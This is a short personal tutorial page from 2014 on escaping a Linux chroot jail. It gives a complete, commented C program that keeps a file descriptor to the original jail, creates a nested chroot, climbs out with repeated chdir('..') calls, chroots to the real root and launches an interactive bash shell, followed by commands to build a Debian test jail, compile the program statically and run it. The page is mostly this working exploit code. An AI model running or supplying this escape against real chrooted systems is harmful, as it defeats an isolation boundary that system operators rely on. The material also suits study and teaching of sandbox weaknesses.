<h1 class="header">Chroot Escaping</h1>
</br>
*09 November 2014* | [View On Github](https://github.com/sevaivanov/kedfilms/blob/master/frontend/static/frontend/md/hacks/chroot.md#chroot-escaping) | [Revision History](https://github.com/sevaivanov/kedfilms/commits/master/frontend/static/frontend/md/hacks/chroot.md)

FD:

A [F]ile [D]escriptor is a pointer to a file.

Each Process has a working directory.
</br></br>

Chroot():

Says to everyone:  Hey, it's the new root!

It changes **sometimes** their working directory to this new root.

Everyone (processes) is locked in this place & not aware of a higher location.


# Using C & gcc

Tested on Debian Wheezy 3.2

Jargon:

1. Real Root : System root
2. Mother Root : Where we are locked, chrooted into.
3. Sub Jail: A new jail that we create in the Mother Root.

## chroot-escape.c

    #include <sys/stat.h>
    #include <unistd.h>
    #include <fcntl.h>

    // printf()
    #include <stdio.h>
    // exit()
    #include <stdlib.h>

    int main()
    {
        int jail_fd;

        /*
            Not root? Set the effective user id to 0, root.
            Priviledged status depends only on the effective UID      
            http://unixpapa.com/incnote/setuid.html
        */
        if (getuid() != 0)
        {
            // printf("%d", geteuid());
            setuid(0);
        }

        /*
            Return a FD of current jail directory (Mother Jail).
            It's a pointer to the mother jail.
            Original chroot() call did not close his FD.
        */
        jail_fd = open(".", O_RDONLY);

        /*
            We need to go inside a Sub Jail created by us.
            You can NOT close your Mother Jail while inside.
        */
        mkdir("cell", 0755);
        chroot("cell");

        /*
            Let's go outside of our new jail to the motherjail.
            Everyone thinks our root is the [yourjail/].
            Since we're root, the system can't stop us.
            We have to refer by a FD because we don't know its path.
        */
        fchdir(jail_fd);

        /*
            Let's close the FD.
            All of the resources of this FD will be freed.
            The mother jail is shut down!
            We're outside of the Sub Jail created by us somewhere we don't know.
        */
        close(jail_fd);

        /*
            Let's go higher & higher to touch the skies!
            Going too high will be interpreted as going to root.
        */
        int i;
        for(i = 0; i < 1000; i++)
        {
            chdir("..");
        }

        // Chroot to the real root place.
        chroot(".");

        // Run an interactive shell from there.
        return execl("/bin/bash", "-i", NULL);
    }


Inspired from [filippo.io](https://filippo.io/escaping-a-chroot-jail-slash-1)

## How to test:

1. Make a jail

        apt-get install binutils debootstrap
        mkdir -p /jails/yourjail
        debootstrap --arch i386 wheezy /jails/yourjail http://http.debian.net/debian
        touch /jails/yourjail/IN_JAIL_NOW

    Inspired from [debian docs](https://wiki.debian.org/chroot).

2. Compile to executable into yourjail

        gcc -static -o jails/yourjail/escape jails/chroot-escape.c

3. Chroot into yourjail

        chroot /jails/yourjail

4. Escape

        ./escape && ls

<p class="footer"></p>